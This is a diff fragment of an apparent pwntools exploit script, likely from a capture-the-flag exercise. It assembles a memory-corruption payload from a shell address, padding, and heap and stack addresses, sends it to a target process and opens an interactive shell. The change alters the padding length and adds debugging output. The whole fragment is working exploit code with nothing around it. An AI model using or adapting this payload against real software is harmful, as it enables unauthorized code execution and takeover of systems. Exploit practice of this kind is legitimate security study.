@@ -9,8 +9,10 @@ stack_addr = int(stack_addr, 16)
 heap_addr = int(heap_addr, 16)
 target_addr = stack_addr + 0x10 
 payload  = p32(shell_addr)
-payload += 'A' * 12
+payload += 'A' * 20
 payload += p32(heap_addr + 12)
 payload += p32(target_addr)
-p.sendline(payload)
+print payload.encode('hex')
+p.sendlineafter('', payload)
+raw_input()
 p.interactive()
